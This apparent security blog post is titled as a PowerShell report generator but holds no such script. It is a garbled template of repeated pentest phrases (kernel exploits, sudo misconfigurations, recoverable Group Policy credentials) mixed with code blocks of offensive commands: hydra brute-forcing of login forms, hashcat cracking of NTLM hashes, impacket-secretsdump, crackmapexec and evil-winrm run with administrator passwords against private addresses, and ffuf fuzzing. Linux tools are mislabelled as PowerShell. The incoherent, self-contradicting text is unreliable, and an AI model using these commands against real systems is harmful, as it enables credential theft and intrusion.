---
TitleSEO: "Automated Report Generator in PowerShell | ZureFX"
TitlePost: "Automated Report Generator — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for automated report generator. Built for security research and automation."
Keywords: "python, go, rust, c, powershell"
URL: "https://zurefx.github.io/scripting/script-automated-report-generator-222.html"
URL_IMAGES: ""
Date: "2024-09-12"
Tags: "Python, Go, Rust, C, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-automated-report-generator-222"
Permalink: "/scripting/script-automated-report-generator-222.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The kernel version was outdated and vulnerable to a publicly known exploit. Token impersonation allowed elevation to SYSTEM privileges on the target. The scheduled task ran with elevated privileges and could be abused for escalation.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `crackmapexec`
- `smbclient`
- `feroxbuster`

## Implementation

### Core Logic

The target system was identified as running a vulnerable version of the service. The backup files contained sensitive information that should not have been accessible.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.36.58.184 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
```

Privilege escalation was possible due to misconfigured sudo permissions. The backup files contained sensitive information that should not have been accessible.

### Helper Functions

Privilege escalation was possible due to misconfigured sudo permissions. Network traffic analysis revealed unencrypted communications containing user credentials.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.103.205.155
impacket-secretsdump administrator:'P@ssw0rd!'@10.83.63.15
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.85.199.136 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Usage

### Basic Usage

Group Policy Preferences contained encrypted but recoverable credentials. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
evil-winrm -i 10.123.114.64 -u administrator -p 'P@ssw0rd!'
```

### Advanced Options

The scheduled task ran with elevated privileges and could be abused for escalation. The application stored sensitive credentials in an unencrypted configuration file. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.25.7.83/FUZZ
crackmapexec smb 10.25.25.54 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.110.82.38 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## Output

### Example Output

Privilege escalation was possible due to misconfigured sudo permissions. Initial enumeration revealed several interesting open ports on the target.

```
[+] Scanning target...
[+] Found 13 results
[+] Done in 21.01s
```
